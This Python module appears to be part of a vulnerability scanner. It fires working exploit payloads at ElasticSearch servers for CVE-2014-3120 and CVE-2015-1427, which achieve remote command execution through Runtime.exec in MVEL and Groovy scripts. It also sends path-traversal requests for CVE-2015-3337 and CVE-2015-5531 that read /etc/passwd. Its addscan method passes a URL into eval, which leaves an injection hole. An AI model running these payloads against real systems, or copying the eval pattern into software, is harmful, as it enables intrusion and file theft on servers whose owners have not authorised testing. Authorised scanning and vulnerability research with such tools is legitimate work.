#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ElasticSearch扫描类: 
        1. ElasticSearch 命令执行
            CVE-2014-3120
                Payload: https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/

        2. ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞
            CVE-2015-1427
                Payload: https://vulhub.org/#/environments/elasticsearch/CVE-2015-1427/

        3. ElasticSearch 目录穿越
            CVE-2015-3337
                Payload: https://vulhub.org/#/environments/elasticsearch/CVE-2015-3337/

        4. ElasticSearch 目录穿越
            CVE-2015-5531
                Payload: https://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''
        #  Elasticsearch写入webshell
        #   WooYun-2015-110216

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep

class ElasticSearch():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ElasticSearch'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2014_3120_payloads = [
            {
                'path': 'website/blog/',
                'data': '{"name": "mouse"}',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': '_search?pretty',
                'data': '''{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\"COMMAND\\").getInputStream()).useDelimiter(\\"\\\\\\\\A\\").next();"
        }
    }
}'''.replace('COMMAND', self.cmd),
                'headers': head.merge(self.headers, {})
            }
        ]

        self.cve_2015_1427_payloads = [
            {
                'path': 'website/blog/',
                'data': '{"name": "mouse2"}',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': '_search?pretty',
                'data': '{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"COMMAND\\").getText()"}}}'.replace('COMMAND', self.cmd),
                'headers': head.merge(self.headers, {})
            }
        ]

        self.cve_2015_3337_payloads = [
            {
                'path': '_plugin/head/../../../../../../../../../etc/passwd',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
        ]

        self.cve_2015_5531_payloads = [
            {
                'path': '_snapshot/mouse3',
                'data': '{"type": "fs","settings": {"location": "/usr/share/elasticsearch/repo/mouse3"}}',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': '_snapshot/mouse33',
                'data': '{"type": "fs","settings": {"location": "/usr/share/elasticsearch/repo/mouse3/snapshot-backdata"}}',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': '_snapshot/mouse3/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
                'data': '',
                'headers': head.merge(self.headers, {})
            }
        ]

    def cve_2014_3120_scan(self, url):
        ''' 老版本ElasticSearch支持传入动态脚本(MVEL)来执行一些复杂的操作,
            而MVEL可执行Java代码, 而且没有沙盒, 所以我们可以直接执行任意代码
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2014-3120'
        vul_info['vul_method'] = 'POST'

        for payload in self.cve_2014_3120_payloads:
            path = payload['path']
            data = payload['data']
            headers = payload['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
                sleep(1)
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Data': data
                    }
                }
                return results

    def cve_2015_1427_scan(self, url):
        ''' ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本, 
            但显然官方的工作并没有做好, lupin和tang3分别提出了两种执行命令的方法
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2015-1427'
        vul_info['vul_method'] = 'POST'

        for payload in self.cve_2015_1427_payloads:
            path = payload['path']
            data = payload['data']
            headers = payload['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
                sleep(1)
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Data': data
                    }
                }
                return results

    def cve_2015_3337_scan(self, url):
        ''' 在安装了具有“site”功能的插件以后, 插件目录使用../即可向上跳转, 
            导致目录穿越漏洞, 可读取任意文件, 没有安装任意插件的elasticsearch不受影响
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'FileRead'
        vul_info['vul_id'] = 'CVE-2015-3337'
        vul_info['vul_method'] = 'GET'

        for payload in self.cve_2015_3337_payloads:
            path = payload['path']
            data = payload['data']
            headers = payload['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('/sbin/nologin' in res.text)
                or ('root:x:0:0:root' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2015_5531_scan(self, url):
        ''' elasticsearch 1.5.1及以前, 无需任何配置即可触发该漏洞; 
            之后的新版, 配置文件elasticsearch.yml中必须存在path.repo, 该配置值为一个目录, 且该目录必须可写, 
            等于限制了备份仓库的根位置, 不配置该值, 默认不启动这个功能
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'FileRead'
        vul_info['vul_id'] = 'CVE-2015-5531'
        # vul_info['vul_method'] = 'PUT/GET'
        vul_info['vul_method'] = 'GET'

        for payload in range(len(self.cve_2015_5531_payloads)):
            # path = payload['path']
            # data = payload['data']
            # headers = payload['headers']

            path = self.cve_2015_5531_payloads[payload]['path']
            data = self.cve_2015_5531_payloads[payload]['data']
            headers = self.cve_2015_5531_payloads[payload]['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                if (payload in [0, 1]):
                    res = requests.put(
                        target, 
                        timeout=self.timeout, 
                        headers=headers,
                        data=data, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                    logger.logging(vul_info, res.status_code, res)                        # * LOG
                    continue

                # elif payload == 2
                sleep(0.5)
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (res.status_code == 400
                and ('114, 111, 111, 116' in res.text)
                and ('Failed to derive' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Prompt': 'ASCII decimal encode'
                    }
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2014_3120_scan, url=url),
            thread(target=self.cve_2015_1427_scan, url=url),
            thread(target=self.cve_2015_3337_scan, url=url),
            thread(target=self.cve_2015_5531_scan, url=url)
        ]

elasticsearch = ElasticSearch()